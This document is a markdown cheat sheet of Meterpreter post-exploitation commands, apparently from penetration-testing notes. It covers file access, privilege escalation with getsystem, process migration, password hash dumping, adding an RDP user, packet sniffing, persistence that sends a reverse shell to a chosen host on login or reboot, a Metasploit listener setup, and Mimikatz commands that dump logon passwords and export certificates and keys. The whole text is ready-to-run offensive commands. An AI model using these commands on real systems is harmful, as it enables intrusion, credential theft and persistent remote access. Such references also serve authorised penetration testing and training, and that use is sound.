# Meterpreter

## Basic commands

These commands are the same both on Windows and \*nix systems. File paths follow the \*nix standard i.e.`/etc/passwd`in windows it's necessary to escape the left dash i.e.`c:\\program\ files\\test`. If no path is specified most commands will default to local folder.

```
pwd
ls
ps
cd <path>                    
cat <file>
edit <file>
search -f <pattern> <path>
upload <filename> <path>
download <file path>
execute -f <path to executable>

getuid        #get hostname + current user
sysinfo       #get arch and OS info
ipconfig      #get net information
migrate       #inject execution to another running process
shell         #spawn a shell (cmd or /bin/bash)
getsystem     #attempt to elevate current user to NT AUTHORITY / SYSTEM
background    #background the shell and go back to msf interface
reboot        #restart the machine
exit          #close remote shell
sessions <id> #switch to another running shell

run hashdump                                #obtain password hashes from windows machine
run getgui -u <user> -p <pass>              #add and RDP-enabled user to current machine
run packetrecorder -li                      #list interfaces
run packetrecorder -i <int> -l <local path> #listen on specified interface and save capture file in given local path
```

## Modules

### Traffic capture

```
use sniffer                        #enable tool
sniffer_interfaces                 #list interfaces
sniffer_dump  <int> <file path>    #retrieve data from interface to file
sniffer_start <int>                #start capturing packets on given interface
sniffer_stats <int>                #show capture data on given interface
sniffer_stop  <int>                #stop capturing on given interface
```

### Persistence

```
run persistence -U -i <timeout> -p <port> -r <host>    #sends a reverse shell at given host:port on user login
run persistence -X -i <timeout> -p <port> -r <host>    #sends a reverse shell at given host:port on machine reboot
```

Additional options

```
-A    #launch a multi/launcher to catch the connection
-L    #location to write the exploit to, default is %TEMP% will be used.
-P    #payload to use, default is windows/meterpreter/reverse_tcp.
-S    #start the agent on boot as a service (with SYSTEM privileges)
-T    #executable to use instead of a payload
```

#### Manual msf listener launch

```
use exploit/multi/handler
set PAYLOAD <payload>
set LHOST <local ip>
set LPORT <port>
exploit
```

### Mimikatz

```
load mimikatz                                   #launch with interactive mode
mimikatz_command -f sekurlsa::logonpasswords    #dump all passwords
mimikatz_command -f handle::list                #list services
mimikatz_command -f handle::tokenImpersonate    #impersonate service
```

#### Services

```
mimikatz_command -f service::list
mimikatz_command -f service::start
mimikatz_command -f service::stop
```

#### Certificates

```
mimikatz_command -f crypto::listProviders
mimikatz_command -f crypto::listKeys
mimikatz_command -f crypto::listCertificates
mimikatz_command -f crypto::exportCertificates
mimikatz_command -f crypto::exportKeys
```

